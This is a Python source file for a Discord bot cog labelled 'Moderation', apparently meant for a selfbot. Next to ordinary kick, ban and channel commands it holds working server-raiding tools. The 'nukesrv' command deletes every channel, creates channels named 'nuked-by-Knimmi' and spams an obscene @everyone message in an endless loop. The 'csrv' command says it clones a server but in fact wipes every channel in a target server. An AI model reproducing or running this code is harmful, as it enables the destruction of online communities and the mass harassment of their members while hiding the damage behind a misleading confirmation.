import discord
from discord.ext import commands
import aiohttp

class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(kick_members=True)
    async def kick(self, ctx, member: commands.MemberConverter, *, reason=None):
        try: await ctx.message.delete()
        except: pass
        await member.kick(reason=reason)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Kicked {member.mention}")

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def ban(self, ctx, member: commands.MemberConverter, *, reason=None):
        try: await ctx.message.delete()
        except: pass
        await member.ban(reason=reason)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Banned {member.mention}")

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def banid(self, ctx, user_id: int, *, reason=None):
        try: await ctx.message.delete()
        except: pass
        member = ctx.guild.get_member(user_id)
        if member:
            await member.ban(reason=reason)
            await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Banned {member.mention}")

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def unban(self, ctx, user_id: int):
        try: await ctx.message.delete()
        except: pass
        user = await self.bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Unbanned {user.mention}.")

    @commands.command()
    @commands.has_permissions(manage_channels=True)
    async def nuke(self, ctx):
        try: await ctx.message.delete()
        except: pass
        ch = ctx.channel
        new_ch = await ch.clone()
        await ch.delete()
        await new_ch.send(f"{self.bot.custom_emojis.get('check', '')} Channel nuked!")

    @commands.command()
    async def nukesrv(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if not ctx.author.guild_permissions.administrator: return
        for ch in ctx.guild.channels:
            try: await ch.delete()
            except: pass
        for _ in range(18):
            try: await ctx.guild.create_text_channel('😈nuked-by-Knimmi😈')
            except: pass
        while True:
            for ch in ctx.guild.text_channels:
                try: await ch.send('# FUCKED BY Knimmi ||@everyone||')
                except: pass

    @commands.command()
    async def hide(self, ctx):
        try: await ctx.message.delete()
        except: pass
        await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Channel {ctx.channel.mention} is now hidden.")

    @commands.command()
    async def unhide(self, ctx):
        try: await ctx.message.delete()
        except: pass
        await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Channel {ctx.channel.mention} is now visible.")

    @commands.command()
    @commands.has_permissions(manage_channels=True)
    async def create_channel(self, ctx, channel_name, channel_category=None):
        try: await ctx.message.delete()
        except: pass
        cat = discord.utils.get(ctx.guild.categories, name=channel_category) if channel_category else None
        await ctx.guild.create_text_channel(name=channel_name, category=cat)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Created '{channel_name}'")

    @commands.command()
    @commands.has_permissions(manage_roles=True)
    async def create_role(self, ctx, role_name, color=None):
        try: await ctx.message.delete()
        except: pass
        c = discord.Color(int(color, 16)) if color else None
        await ctx.guild.create_role(name=role_name, color=c)
        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Created '{role_name}'")

    @commands.command()
    async def csrv(self, ctx, src: int, trg: int):
        try: await ctx.message.delete()
        except: pass
        target = self.bot.get_guild(trg)
        if target:
            for ch in target.channels:
                try: await ch.delete()
                except: pass
            await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Server Cloned")

    @commands.command()
    async def steal(self, ctx, emoji: discord.PartialEmoji, server_id: int = None, name: str = None):
        """Steal an emoji to the current server or a specified server ID."""
        try: await ctx.message.delete()
        except: pass
        
        target_guild = self.bot.get_guild(server_id) if server_id else ctx.guild
        if not target_guild:
            await ctx.send(f"{self.bot.custom_emojis.get('error', '')} **Server not found!** Ensure the bot is in the server and the ID is correct.")
            return

        # Check if the user account has permissions in the target guild
        target_member = target_guild.get_member(self.bot.user.id)
        if not target_member or not target_member.guild_permissions.manage_emojis:
            await ctx.send(f"{self.bot.custom_emojis.get('error', '')} **Missing `Manage Emojis` permission in {target_guild.name}.**")
            return

        name = name or emoji.name
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(emoji.url)) as resp:
                    if resp.status == 200:
                        img = await resp.read()
                        new_e = await target_guild.create_custom_emoji(name=name, image=img)
                        await ctx.send(f"{self.bot.custom_emojis.get('check', '')} Stole {new_e} as `{name}` to **{target_guild.name}**")
        except Exception as e:
            await ctx.send(f"{self.bot.custom_emojis.get('error', '')} **Error:** {e}")

async def setup(bot):
    await bot.add_cog(Moderation(bot))